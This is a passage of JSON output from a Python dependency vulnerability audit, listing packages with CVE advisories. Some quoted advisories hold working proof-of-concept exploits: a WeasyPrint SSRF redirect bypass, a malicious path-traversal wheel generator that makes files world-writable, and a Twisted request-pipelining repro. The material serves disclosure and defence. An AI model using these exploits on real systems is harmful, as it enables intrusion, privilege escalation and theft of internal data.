4.49.0, and the issue is resolved in version 4.51.0. The vulnerability arises from the use of a regular expression pattern `config\\.(.*)\\.json` that can be exploited to cause excessive CPU consumption through crafted input strings, leading to catastrophic backtracking. This can result in model serving disruption, resource exhaustion, and increased latency in applications using the library."}, {"id": "CVE-2025-3264", "fix_versions": ["4.51.0"], "aliases": ["GHSA-jjph-296x-mrcr"], "description": "A Regular Expression Denial of Service (ReDoS) vulnerability was discovered in the Hugging Face Transformers library, specifically in the `get_imports()` function within `dynamic_module_utils.py`. This vulnerability affects versions 4.49.0 and is fixed in version 4.51.0. The issue arises from a regular expression pattern `\\s*try\\s*:.*?except.*?:` used to filter out try/except blocks from Python code, which can be exploited to cause excessive CPU consumption through crafted input strings due to catastrophic backtracking. This vulnerability can lead to remote code loading disruption, resource exhaustion in model serving, supply chain attack vectors, and development pipeline disruption."}, {"id": "CVE-2025-3777", "fix_versions": ["4.52.1"], "aliases": ["GHSA-phhr-52qp-3mj4"], "description": "Hugging Face Transformers versions up to 4.49.0 are affected by an improper input validation vulnerability in the `image_utils.py` file. The vulnerability arises from insecure URL validation using the `startswith()` method, which can be bypassed through URL username injection. This allows attackers to craft URLs that appear to be from YouTube but resolve to malicious domains, potentially leading to phishing attacks, malware distribution, or data exfiltration. The issue is fixed in version 4.52.1."}, {"id": "CVE-2025-3933", "fix_versions": ["4.52.1"], "aliases": ["GHSA-37mw-44qp-f5jm"], "description": "A Regular Expression Denial of Service (ReDoS) vulnerability was discovered in the Hugging Face Transformers library, specifically within the DonutProcessor class's `token2json()` method. This vulnerability affects versions 4.51.3 and earlier, and is fixed in version 4.52.1. The issue arises from the regex pattern `<s_(.*?)>` which can be exploited to cause excessive CPU consumption through crafted input strings due to catastrophic backtracking. This vulnerability can lead to service disruption, resource exhaustion, and potential API service vulnerabilities, impacting document processing tasks using the Donut model."}, {"id": "CVE-2025-5197", "fix_versions": ["4.53.0"], "aliases": ["GHSA-9356-575x-2w9m"], "description": "A Regular Expression Denial of Service (ReDoS) vulnerability exists in the Hugging Face Transformers library, specifically in the `convert_tf_weight_name_to_pt_weight_name()` function. This function, responsible for converting TensorFlow weight names to PyTorch format, uses a regex pattern `/[^/]*___([^/]*)/` that can be exploited to cause excessive CPU consumption through crafted input strings due to catastrophic backtracking. The vulnerability affects versions up to 4.51.3 and is fixed in version 4.53.0. This issue can lead to service disruption, resource exhaustion, and potential API service vulnerabilities, impacting model conversion processes between TensorFlow and PyTorch formats."}, {"id": "CVE-2025-6638", "fix_versions": ["4.53.0"], "aliases": ["GHSA-59p9-h35m-wg4g"], "description": "A Regular Expression Denial of Service (ReDoS) vulnerability was discovered in the Hugging Face Transformers library, specifically affecting the MarianTokenizer's `remove_language_code()` method. This vulnerability is present in version 4.52.4 and has been fixed in version 4.53.0. The issue arises from inefficient regex processing, which can be exploited by crafted input strings containing malformed language code patterns, leading to excessive CPU consumption and potential denial of service."}, {"id": "CVE-2025-6051", "fix_versions": ["4.53.0"], "aliases": ["GHSA-rcv9-qm8p-9p6j"], "description": "A Regular Expression Denial of Service (ReDoS) vulnerability was discovered in the Hugging Face Transformers library, specifically within the `normalize_numbers()` method of the `EnglishNormalizer` class. This vulnerability affects versions up to 4.52.4 and is fixed in version 4.53.0. The issue arises from the method's handling of numeric strings, which can be exploited using crafted input strings containing long sequences of digits, leading to excessive CPU consumption. This vulnerability impacts text-to-speech and number normalization tasks, potentially causing service disruption, resource exhaustion, and API vulnerabilities."}, {"id": "CVE-2025-6921", "fix_versions": ["4.53.0"], "aliases": ["GHSA-4w7r-h757-3r74"], "description": "The huggingface/transformers library, versions prior to 4.53.0, is vulnerable to Regular Expression Denial of Service (ReDoS) in the AdamWeightDecay optimizer. The vulnerability arises from the _do_use_weight_decay method, which processes user-controlled regular expressions in the include_in_weight_decay and exclude_from_weight_decay lists. Malicious regular expressions can cause catastrophic backtracking during the re.search call, leading to 100% CPU utilization and a denial of service. This issue can be exploited by attackers who can control the patterns in these lists, potentially causing the machine learning task to hang and rendering services unresponsive."}]}, {"name": "truststore", "version": "0.8.0", "vulns": []}, {"name": "twisted", "version": "23.10.0", "vulns": [{"id": "PYSEC-2024-75", "fix_versions": ["24.7.0rc1"], "aliases": ["CVE-2024-41810", "GHSA-cf56-g6w6-pqq2"], "description": "Twisted is an event-based framework for internet applications, supporting Python 3.6+. The `twisted.web.util.redirectTo` function contains an HTML injection vulnerability. If application code allows an attacker to control the redirect URL this vulnerability may result in Reflected Cross-Site Scripting (XSS) in the redirect response HTML body. This vulnerability is fixed in 24.7.0rc1."}, {"id": "CVE-2024-41671", "fix_versions": ["24.7.0rc1"], "aliases": ["GHSA-c8m8-j448-xjx7"], "description": "### Summary  The HTTP 1.0 and 1.1 server provided by twisted.web could process pipelined HTTP requests out-of-order, possibly resulting in information disclosure.  ### PoC 0. Start a fresh Debian container: ```sh docker run --workdir /repro --rm -it debian:bookworm-slim ``` 1. Install twisted and its dependencies: ```sh apt -y update && apt -y install ncat git python3 python3-pip \\     && git clone --recurse-submodules https://github.com/twisted/twisted \\     && cd twisted \\     && pip3 install --break-system-packages . ``` 2. Run a twisted.web HTTP server that echos received requests' methods. e.g., the following: ```python from twisted.web import server, resource from twisted.internet import reactor  class TheResource(resource.Resource):     isLeaf = True      def render_GET(self, request) -> bytes:         return b\"GET\"      def render_POST(self, request) -> bytes:         return b\"POST\"  site = server.Site(TheResource()) reactor.listenTCP(80, site) reactor.run() ``` 3. Send it a POST request with a chunked message body, pipelined with another POST request, wait a second, then send a GET request on the same connection: ```sh (printf 'POST / HTTP/1.1\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nPOST / HTTP/1.1\\r\\nContent-Length: 0\\r\\n\\r\\n'; sleep 1; printf 'GET / HTTP/1.1\\r\\n\\r\\n'; sleep 1) | nc localhost 80 ``` 4. Observe that the responses arrive out of order: ``` HTTP/1.1 200 OK Server: TwistedWeb/24.3.0.post0 Date: Tue, 09 Jul 2024 06:19:41 GMT Content-Length: 5 Content-Type: text/html  POST HTTP/1.1 200 OK Server: TwistedWeb/24.3.0.post0 Date: Tue, 09 Jul 2024 06:19:42 GMT Content-Length: 4 Content-Type: text/html  GET HTTP/1.1 200 OK Server: TwistedWeb/24.3.0.post0 Date: Tue, 09 Jul 2024 06:19:42 GMT Content-Length: 5 Content-Type: text/html  POST ```  ### Impact See [GHSA-xc8x-vp79-p3wm](https://github.com/twisted/twisted/security/advisories/GHSA-xc8x-vp79-p3wm). Further, for instances of twisted.web HTTP servers deployed behind reverse proxies that implement connection pooling, it may be possible for remote attackers to receive responses intended for other clients of the twisted.web server."}]}, {"name": "twisted-iocpsupport", "version": "1.0.2", "vulns": []}, {"name": "typer", "version": "0.15.2", "vulns": []}, {"name": "typer-slim", "version": "0.21.1", "vulns": []}, {"name": "typing-extensions", "version": "4.15.0", "vulns": []}, {"name": "typing-inspection", "version": "0.4.2", "vulns": []}, {"name": "tzdata", "version": "2025.3", "vulns": []}, {"name": "uc-micro-py", "version": "1.0.1", "vulns": []}, {"name": "ucimlrepo", "version": "0.0.7", "vulns": []}, {"name": "ujson", "version": "5.10.0", "vulns": []}, {"name": "unicodedata2", "version": "15.1.0", "vulns": []}, {"name": "unidecode", "version": "1.3.8", "vulns": []}, {"name": "urllib3", "version": "2.2.3", "vulns": [{"id": "CVE-2025-50182", "fix_versions": ["2.5.0"], "aliases": ["GHSA-48p4-8xcf-vxj5"], "description": "urllib3 [supports](https://urllib3.readthedocs.io/en/2.4.0/reference/contrib/emscripten.html) being used in a Pyodide runtime utilizing the [JavaScript Fetch API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API) or falling back on [XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest). This means you can use Python libraries to make HTTP requests from your browser or Node.js. Additionally, urllib3 provides [a mechanism](https://urllib3.readthedocs.io/en/2.4.0/user-guide.html#retrying-requests) to control redirects.  However, the `retries` and `redirect` parameters are ignored with Pyodide; the runtime itself determines redirect behavior.   ## Affected usages  Any code which relies on urllib3 to control the number of redirects for an HTTP request in a Pyodide runtime.   ## Impact  Redirects are often used to exploit SSRF vulnerabilities. An application attempting to mitigate SSRF or open redirect vulnerabilities by disabling redirects may remain vulnerable if a Pyodide runtime redirect mechanism is unsuitable.   ## Remediation  If you use urllib3 in Node.js, upgrade to a patched version of urllib3.  Unfortunately, browsers provide no suitable way which urllib3 can use: `XMLHttpRequest` provides no control over redirects, the Fetch API returns `opaqueredirect` responses lacking data when redirects are controlled manually. Expect default browser behavior for redirects."}, {"id": "CVE-2025-50181", "fix_versions": ["2.5.0"], "aliases": ["GHSA-pq67-6m6q-mj2v"], "description": "urllib3 handles redirects and retries using the same mechanism, which is controlled by the `Retry` object. The most common way to disable redirects is at the request level, as follows:  ```python resp = urllib3.request(\"GET\", \"https://httpbin.org/redirect/1\", redirect=False) print(resp.status) # 302 ```  However, it is also possible to disable redirects, for all requests, by instantiating a `PoolManager` and specifying `retries` in a way that disable redirects:  ```python import urllib3  http = urllib3.PoolManager(retries=0)  # should raise MaxRetryError on redirect http = urllib3.PoolManager(retries=urllib3.Retry(redirect=0))  # equivalent to the above http = urllib3.PoolManager(retries=False)  # should return the first response  resp = http.request(\"GET\", \"https://httpbin.org/redirect/1\") ```  However, the `retries` parameter is currently ignored, which means all the above examples don't disable redirects.  ## Affected usages  Passing `retries` on `PoolManager` instantiation to disable redirects or restrict their number.  By default, requests and botocore users are not affected.  ## Impact  Redirects are often used to exploit SSRF vulnerabilities. An application attempting to mitigate SSRF or open redirect vulnerabilities by disabling redirects at the PoolManager level will remain vulnerable.  ## Remediation  You can remediate this vulnerability with the following steps:   * Upgrade to a patched version of urllib3. If your organization would benefit from the continued support of urllib3 1.x, please contact [sethmichaellarson@gmail.com](mailto:sethmichaellarson@gmail.com) to discuss sponsorship or contribution opportunities.  * Disable redirects at the `request()` level instead of the `PoolManager()` level."}, {"id": "CVE-2025-66418", "fix_versions": ["2.6.0"], "aliases": ["GHSA-gm62-xv2j-4w53"], "description": "## Impact  urllib3 supports chained HTTP encoding algorithms for response content according to RFC 9110 (e.g., `Content-Encoding: gzip, zstd`).  However, the number of links in the decompression chain was unbounded allowing a malicious server to insert a virtually unlimited number of compression steps leading to high CPU usage and massive memory allocation for the decompressed data.   ## Affected usages  Applications and libraries using urllib3 version 2.5.0 and earlier for HTTP requests to untrusted sources unless they disable content decoding explicitly.   ## Remediation  Upgrade to at least urllib3 v2.6.0 in which the library limits the number of links to 5.  If upgrading is not immediately possible, use [`preload_content=False`](https://urllib3.readthedocs.io/en/2.5.0/advanced-usage.html#streaming-and-i-o) and ensure that `resp.headers[\"content-encoding\"]` contains a safe number of encodings before reading the response content."}, {"id": "CVE-2025-66471", "fix_versions": ["2.6.0"], "aliases": ["GHSA-2xpw-w6gg-jr37"], "description": "### Impact  urllib3's [streaming API](https://urllib3.readthedocs.io/en/2.5.0/advanced-usage.html#streaming-and-i-o) is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once.  When streaming a compressed response, urllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). The library must read compressed data from the network and decompress it until the requested chunk size is met. Any resulting decompressed data that exceeds the requested amount is held in an internal buffer for the next read operation.  The decompression logic could cause urllib3 to fully decode a small amount of highly compressed data in a single operation. This can result in excessive resource consumption (high CPU usage and massive memory allocation for the decompressed data; CWE-409) on the client side, even if the application only requested a small chunk of data.   ### Affected usages  Applications and libraries using urllib3 version 2.5.0 and earlier to stream large compressed responses or content from untrusted sources.  `stream()`, `read(amt=256)`, `read1(amt=256)`, `read_chunked(amt=256)`, `readinto(b)` are examples of `urllib3.HTTPResponse` method calls using the affected logic unless decoding is disabled explicitly.   ### Remediation  Upgrade to at least urllib3 v2.6.0 in which the library avoids decompressing data that exceeds the requested amount.  If your environment contains a package facilitating the Brotli encoding, upgrade to at least Brotli 1.2.0 or brotlicffi 1.2.0.0 too. These versions are enforced by the `urllib3[brotli]` extra in the patched versions of urllib3.   ### Credits  The issue was reported by @Cycloctane. Supplemental information was provided by @stamparm during a security audit performed by [7ASecurity](https://7asecurity.com/) and facilitated by [OSTIF](https://ostif.org/)."}, {"id": "CVE-2026-21441", "fix_versions": ["2.6.3"], "aliases": ["GHSA-38jv-5279-wg99"], "description": "### Impact  urllib3's [streaming API](https://urllib3.readthedocs.io/en/2.6.2/advanced-usage.html#streaming-and-i-o) is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once.  urllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). When using the streaming API, the library decompresses only the necessary bytes, enabling partial content consumption.  However, for HTTP redirect responses, the library would read the entire response body to drain the connection and decompress the content unnecessarily. This decompression occurred even before any read methods were called, and configured read limits did not restrict the amount of decompressed data. As a result, there was no safeguard against decompression bombs. A malicious server could exploit this to trigger excessive resource consumption on the client (high CPU usage and large memory allocations for decompressed data; CWE-409).  ### Affected usages  Applications and libraries using urllib3 version 2.6.2 and earlier to stream content from untrusted sources by setting `preload_content=False` when they do not disable redirects.   ### Remediation  Upgrade to at least urllib3 v2.6.3 in which the library does not decode content of redirect responses when `preload_content=False`.  If upgrading is not immediately possible, disable [redirects](https://urllib3.readthedocs.io/en/2.6.2/user-guide.html#retrying-requests) by setting `redirect=False` for requests to untrusted source."}]}, {"name": "uvicorn", "version": "0.27.1", "vulns": []}, {"name": "virtualenv", "version": "20.36.0", "vulns": [{"id": "CVE-2026-22702", "fix_versions": ["20.36.1"], "aliases": ["GHSA-597g-3phw-6986", "BIT-virtualenv-2026-22702"], "description": "## Impact  TOCTOU (Time-of-Check-Time-of-Use) vulnerabilities in `virtualenv` allow local attackers to perform symlink-based attacks on directory creation operations. An attacker with local access can exploit a race condition between directory existence checks and creation to redirect virtualenv's app_data and lock file operations to attacker-controlled locations.  **Affected versions:** All versions up to and including 20.36.1  **Affected users:** Any user running `virtualenv` on multi-user systems where untrusted local users have filesystem access to shared temporary directories or where `VIRTUALENV_OVERRIDE_APP_DATA` points to a user-writable location.  **Attack scenarios:** - Cache poisoning: Attacker corrupts wheels or Python metadata in the cache - Information disclosure: Attacker reads sensitive cached data or metadata - Lock bypass: Attacker controls lock file semantics to cause concurrent access violations - Denial of service: Lock starvation preventing virtualenv operations  ## Patches  The vulnerability has been patched by replacing check-then-act patterns with atomic `os.makedirs(..., exist_ok=True)` operations.  **Fixed in:** PR #3013  **Versions with the fix:** 20.36.2 and later  Users should upgrade to version 20.36.2 or later.  ## Workarounds  If you cannot upgrade immediately:  1. Ensure `VIRTUALENV_OVERRIDE_APP_DATA` points to a directory owned by the current user with restricted permissions (mode 0700) 2. Avoid running `virtualenv` in shared temporary directories where other users have write access 3. Use separate user accounts for different projects to isolate app_data directories  ## References  - GitHub PR: https://github.com/pypa/virtualenv/pull/3013 - Vulnerability reported by: @tsigouris007 - CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization (TOCTOU) - CWE-59: Improper Link Resolution Before File Access"}]}, {"name": "w3lib", "version": "2.1.2", "vulns": []}, {"name": "wasabi", "version": "1.1.3", "vulns": []}, {"name": "watchdog", "version": "4.0.1", "vulns": []}, {"name": "watchfiles", "version": "1.1.1", "vulns": []}, {"name": "wcwidth", "version": "0.2.5", "vulns": []}, {"name": "weasel", "version": "0.4.1", "vulns": []}, {"name": "weasyprint", "version": "67.0", "vulns": [{"id": "CVE-2025-68616", "fix_versions": ["68.0"], "aliases": ["GHSA-983w-rhvv-gwmv"], "description": "### Summary  A **Server-Side Request Forgery (SSRF) Protection Bypass** exists in WeasyPrint's `default_url_fetcher`. The vulnerability allows attackers to access internal network resources (such as `localhost` services or cloud metadata endpoints) even when a developer has implemented a custom `url_fetcher` to block such access. This occurs because the underlying `urllib` library follows HTTP redirects automatically without re-validating the new destination against the developer's security policy.  ### Details  The default URL fetching mechanism in WeasyPrint (default_url_fetcher in weasyprint/urls.py) is vulnerable to a Server-Side Request Forgery (SSRF) Protection Bypass.  While WeasyPrint allows developers to define custom url_fetcher functions to validate or sanitize URLs before fetching (e.g., blocking internal IP addresses or specific ports), the underlying implementation uses Python's standard urllib.request.urlopen. By default, urllib automatically follows HTTP redirects (status codes 301, 302, 307, etc.) without returning control to the developer's validation logic for the new target URL.  This behavior creates a Time-of-Check to Time-of-Use (TOCTOU) vulnerability. An attacker can provide a URL that passes the developer's allowlist/blocklist (the Check) but immediately redirects to a blocked internal resource (the Use).  ### PoC  To reproduce this vulnerability, use the following setup. This scenario simulates a developer attempting to blacklist access to internal hostnames (e.g., `localhost`).  **1. victim.py (Internal Service - Port 5000)** Simulates a sensitive internal service running on localhost.  ```python from flask import Flask app = Flask(__name__)  @app.route('/secret') def secret():     return \"CRITICAL_INTERNAL_DATA\"  if __name__ == '__main__':     # Listens on localhost:5000     app.run(port=5000) ```  **2. attacker.py (External Redirector - Port 1337)** Simulates an external server. It accepts a request and redirects it to the blocked hostname (`localhost`).  ```python from flask import Flask, redirect app = Flask(__name__)  @app.route('/image.png') def malicious():     # The vulnerability: Redirects to the BLOCKED hostname     return redirect(\"http://localhost:5000/secret\", code=302)  if __name__ == '__main__':     app.run(port=1337) ```  **3. exploit.py (Vulnerable Implementation)** Simulates the application with a security filter intended to block access to \"localhost\".  ```python from weasyprint import HTML, default_url_fetcher import logging  # Security Filter: Intended to block internal hostnames def secure_fetcher(url):     # Simulates a blacklist for 'localhost'     if \"localhost\" in url:         raise PermissionError(f\"Security Block: Access to {url} denied.\")          print(f\"[ALLOWED] Initial URL check passed for: {url}\")     return default_url_fetcher(url)  # EXPLOIT LOGIC: # 1. We access the attacker via '127.0.0.1' (or an external IP).  #    The string \"127.0.0.1\" passes the check because it is not \"localhost\". # 2. The attacker redirects to \"http://localhost:5000/...\". # 3. urllib follows the redirect to 'localhost' without re-triggering secure_fetcher.  try:     # Use 127.0.0.1 to bypass the string check for 'localhost'     html_content = '<link rel=\"attachment\" href=\"http://54.234.88.160:1337/image.png\">'          doc = HTML(string=html_content, url_fetcher=secure_fetcher)     doc.write_pdf(\"exploit.pdf\")          print(\"Exploit successful. The 'localhost' block was bypassed via redirect.\")     print(\"Check exploit.pdf for 'CRITICAL_INTERNAL_DATA'.\") except Exception as e:     print(f\"Exploit failed: {e}\") ``` **4. Attacker read attachment in PDF** ``` \u279c pdfdetach -list resultado_exploit.pdf 1 embedded files 1: secret \u279c pdfdetach -saveall resultado_exploit.pdf \u279c cat secret CRITICAL_INTERNAL_DATA ``` **Evidence** <img width=\"1514\" height=\"436\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f7881694-be4d-4c63-8bca-2b220e4c87f9\" />  ### Impact  This vulnerability impacts any application or SaaS platform using WeasyPrint to render user-supplied HTML/CSS that attempts to restrict external resource loading.    * **Internal Network Reconnaissance:** Attackers can bypass firewalls or allowlists to scan and access internal services (e.g., Redis, ElasticSearch, Admin Panels) running on the loopback interface or local network.   * **Cloud Metadata Exfiltration:** In cloud environments, attackers can redirect requests to metadata services (e.g., `http://169.254.169.254`) to steal instance credentials and escalate privileges.   * **Security Control Bypass:** It renders the `url_fetcher` security validation logic ineffective against sophisticated attacks, creating a false sense of security for developers."}]}, {"name": "webencodings", "version": "0.5.1", "vulns": []}, {"name": "websocket-client", "version": "1.8.0", "vulns": []}, {"name": "websockets", "version": "16.0", "vulns": []}, {"name": "werkzeug", "version": "3.0.3", "vulns": [{"id": "CVE-2024-49766", "fix_versions": ["3.0.6"], "aliases": ["GHSA-f9vj-2wh5-fj8j"], "description": "On Python < 3.11 on Windows, `os.path.isabs()` does not catch UNC paths like `//server/share`. Werkzeug's `safe_join()` relies on this check, and so can produce a path that is not safe, potentially allowing unintended access to data. Applications using Python >= 3.11, or not using Windows, are not vulnerable."}, {"id": "CVE-2024-49767", "fix_versions": ["3.0.6"], "aliases": ["GHSA-q34m-jh98-gwm2"], "description": "Applications using Werkzeug to parse `multipart/form-data` requests are vulnerable to resource exhaustion. A specially crafted form body can bypass the `Request.max_form_memory_size` setting.   The `Request.max_content_length` setting, as well as resource limits provided by deployment software and platforms, are also available to limit the resources used during a request. This vulnerability does not affect those settings. All three types of limits should be considered and set appropriately when deploying an application."}, {"id": "CVE-2025-66221", "fix_versions": ["3.1.4"], "aliases": ["GHSA-hgf8-39gv-g3f2"], "description": "Werkzeug's `safe_join` function allows path segments with Windows device names. On Windows, there are special device names such as `CON`, `AUX`, etc that are implicitly present and readable in every directory. `send_from_directory` uses `safe_join` to safely serve files at user-specified paths under a directory. If the application is running on Windows, and the requested path ends with a special device name, the file will be opened successfully, but reading will hang indefinitely."}, {"id": "CVE-2026-21860", "fix_versions": ["3.1.5"], "aliases": ["GHSA-87hc-h4r5-73f7"], "description": "Werkzeug's `safe_join` function allows path segments with Windows device names that have file extensions or trailing spaces. On Windows, there are special device names such as `CON`, `AUX`, etc that are implicitly present and readable in every directory. Windows still accepts them with any file extension, such as `CON.txt`, or trailing spaces such as `CON `.  This was previously reported as https://github.com/pallets/werkzeug/security/advisories/GHSA-hgf8-39gv-g3f2, but the fix failed to account for compound extensions such as `CON.txt.html` or trailing spaces. It also missed some additional special names.  `send_from_directory` uses `safe_join` to safely serve files at user-specified paths under a directory. If the application is running on Windows, and the requested path ends with a special device name, the file will be opened successfully, but reading will hang indefinitely."}]}, {"name": "whatthepatch", "version": "1.0.2", "vulns": []}, {"name": "wheel", "version": "0.44.0", "vulns": [{"id": "CVE-2026-24049", "fix_versions": ["0.46.2"], "aliases": ["GHSA-8rrh-rw8j-w5fx"], "description": "### Summary  - **Vulnerability Type:** Path Traversal (CWE-22) leading to Arbitrary File Permission Modification.    - **Root Cause Component:** wheel.cli.unpack.unpack function.    - **Affected Packages:**      1. wheel (Upstream source)      2. setuptools (Downstream, vendors wheel)    - **Severity:** High (Allows modifying system file permissions).    ### Details   The vulnerability exists in how the unpack function handles file permissions after extraction. The code blindly trusts the filename from the archive header for the chmod operation, even though the extraction process itself might have sanitized the path.   ``` # Vulnerable Code Snippet (present in both wheel and setuptools/_vendor/wheel) for zinfo in wf.filelist:     wf.extract(zinfo, destination)  # (1) Extraction is handled safely by zipfile      # (2) VULNERABILITY:     # The 'permissions' are applied to a path constructed using the UNSANITIZED 'zinfo.filename'.     # If zinfo.filename contains \"../\", this targets files outside the destination.     permissions = zinfo.external_attr >> 16 & 0o777     destination.joinpath(zinfo.filename).chmod(permissions) ```    ### PoC   I have confirmed this exploit works against the unpack function imported from setuptools._vendor.wheel.cli.unpack.    **Prerequisites:** pip install setuptools    **Step 1: Generate the Malicious Wheel (gen_poc.py)**   This script creates a wheel that passes internal hash validation but contains a directory traversal payload in the file list.   ``` import zipfile import hashlib import base64 import os  def urlsafe_b64encode(data):     \"\"\"     Helper function to encode data using URL-safe Base64 without padding.     Required by the Wheel file format specification.     \"\"\"     return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')  def get_hash_and_size(data_bytes):     \"\"\"     Calculates SHA-256 hash and size of the data.     These values are required to construct a valid 'RECORD' file,     which is used by the 'wheel' library to verify integrity.     \"\"\"     digest = hashlib.sha256(data_bytes).digest()     hash_str = \"sha256=\" + urlsafe_b64encode(digest)     return hash_str, str(len(data_bytes))  def create_evil_wheel_v4(filename=\"evil-1.0-py3-none-any.whl\"):     print(f\"[Generator V4] Creating 'Authenticated' Malicious Wheel: {filename}\")      # 1. Prepare Standard Metadata Content     # These are minimal required contents to make the wheel look legitimate.     wheel_content = b\"Wheel-Version: 1.0\\nGenerator: bdist_wheel (0.37.1)\\nRoot-Is-Purelib: true\\nTag: py3-none-any\\n\"     metadata_content = b\"Metadata-Version: 2.1\\nName: evil\\nVersion: 1.0\\nSummary: PoC Package\\n\"         # 2. Define Malicious Payload (Path Traversal)     # The content doesn't matter, but the path does.     payload_content = b\"PWNED by Path Traversal\"      # [ATTACK VECTOR]: Target a file OUTSIDE the extraction directory using '../'     # The vulnerability allows 'chmod' to affect this path directly.     malicious_path = \"../../poc_target.txt\"      # 3. Calculate Hashes for Integrity Check Bypass     # The 'wheel' library verifies if the file hash matches the RECORD entry.     # To bypass this check, we calculate the correct hash for our malicious file.     wheel_hash, wheel_size = get_hash_and_size(wheel_content)     metadata_hash, metadata_size = get_hash_and_size(metadata_content)     payload_hash, payload_size = get_hash_and_size(payload_content)      # 4. Construct the 'RECORD' File     # The RECORD file lists all files in the wheel with their hashes.     # CRITICAL: We explicitly register the malicious path ('../../poc_target.txt') here.     # This tricks the 'wheel' library into treating the malicious file as a valid, verified component.     record_lines = [         f\"evil-1.0.dist-info/WHEEL,{wheel_hash},{wheel_size}\",         f\"evil-1.0.dist-info/METADATA,{metadata_hash},{metadata_size}\",         f\"{malicious_path},{payload_hash},{payload_size}\",  # <-- Authenticating the malicious path         \"evil-1.0.dist-info/RECORD,,\"     ]     record_content = \"\\n\".join(record_lines).encode('utf-8')      # 5. Build the Zip File     with zipfile.ZipFile(filename, \"w\") as zf:         # Write standard metadata files         zf.writestr(\"evil-1.0.dist-info/WHEEL\", wheel_content)         zf.writestr(\"evil-1.0.dist-info/METADATA\", metadata_content)         zf.writestr(\"evil-1.0.dist-info/RECORD\", record_content)          # [EXPLOIT CORE]: Manually craft ZipInfo for the malicious file         # We need to set specific permission bits to trigger the vulnerability.         zinfo = zipfile.ZipInfo(malicious_path)                 # Set external attributes to 0o777 (rwxrwxrwx)         # Upper 16 bits: File type (0o100000 = Regular File)         # Lower 16 bits: Permissions (0o777 = World Writable)         # The vulnerable 'unpack' function will blindly apply this '777' to the system file.         zinfo.external_attr = (0o100000 | 0o777) << 16                 zf.writestr(zinfo, payload_content)      print(\"[Generator V4] Done. Malicious file added to RECORD and validation checks should pass.\")  if __name__ == \"__main__\":     create_evil_wheel_v4() ```    **Step 2: Run the Exploit (exploit.py)**   ``` from pathlib import Path import sys  # Demonstrating impact on setuptools try:     from setuptools._vendor.wheel.cli.unpack import unpack     print(\"[*] Loaded unpack from setuptools\") except ImportError:     from wheel.cli.unpack import unpack     print(\"[*] Loaded unpack from wheel\")  # 1. Setup Target (Read-Only system file simulation) target = Path(\"poc_target.txt\") target.write_text(\"SENSITIVE CONFIG\") target.chmod(0o400) # Read-only print(f\"[*] Initial Perms: {oct(target.stat().st_mode)[-3:]}\")  # 2. Run Vulnerable Unpack # The wheel contains \"../../poc_target.txt\". # unpack() will extract safely, BUT chmod() will hit the actual target file. try:     unpack(\"evil-1.0-py3-none-any.whl\", \"unpack_dest\") except Exception as e:     print(f\"[!] Ignored expected extraction error: {e}\")  # 3. Check Result final_perms = oct(target.stat().st_mode)[-3:] print(f\"[*] Final Perms: {final_perms}\")  if final_perms == \"777\":     print(\"VULNERABILITY CONFIRMED: Target file is now world-writable (777)!\") else:     print(\"[-] Attack failed.\") ```    **result:**   <img width=\"806\" height=\"838\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f750eb3b-36ea-445c-b7f4-15c14eb188db\" />      ### Impact   Attackers can craft a malicious wheel file that, when unpacked, changes the permissions of critical system files (e.g., /etc/passwd, SSH keys, config files) to 777. This allows for Privilege Escalation or arbitrary code execution by modifying now-writable scripts.    ### Recommended Fix   The unpack function must not use zinfo.filename for post-extraction operations. It should use the sanitized path returned by wf.extract().    ### Suggested Patch:   ``` # extract() returns the actual path where the file was written extracted_path = wf.extract(zinfo, destination)  # Only apply chmod if a file was actually written if extracted_path:     permissions = zinfo.external_attr >> 16 & 0o777     Path(extracted_path).chmod(permissions) ```"}]}, {"name": "widgetsnbextension", "version": "3.6.6", "vulns": []}, {"name": "win-inet-pton", "version": "1.1.0", "vulns": []}, {"name": "wrapt", "version": "1.14.1", "vulns": []}, {"name": "xarray", "version": "2023.6.0", "vulns": []}, {"name": "xlwings", "version": "0.32.1", "vulns": []}, {"name": "xyzservices", "version": "2022.9.0", "vulns": []}, {"name": "yapf", "version": "0.40.2", "vulns": []}, {"name": "yarl", "version": "1.11.0", "vulns": []}, {"name": "zict", "version": "3.0.0", "vulns": []}, {"name": "zipp", "version": "3.17.0", "vulns": [{"id": "CVE-2024-5569", "fix_versions": ["3.19.1"], "aliases": ["GHSA-jfmj-5v4g-7637"], "description": "A Denial of Service (DoS) vulnerability exists in the jaraco/zipp library, affecting all versions prior to 3.19.1. The vulnerability is triggered when processing a specially crafted zip file that leads to an infinite loop. This issue also impacts the zipfile module of CPython, as features from the third-party zipp library are later merged into CPython, and the affected code is identical in both projects. The infinite loop can be initiated through the use of functions affecting the `Path` module in both zipp and zipfile, such as `joinpath`, the overloaded division operator, and `iterdir`. Although the infinite loop is not resource exhaustive, it prevents the application from responding. The vulnerability was addressed in version 3.19.1 of jaraco/zipp."}]}, {"name": "zope-interface", "version": "5.4.0", "vulns": []}, {"name": "zopfli", "version": "0.4.0", "vulns": []}, {"name": "zstandard", "version": "0.23.0", "vulns": []}], "fixes": []}
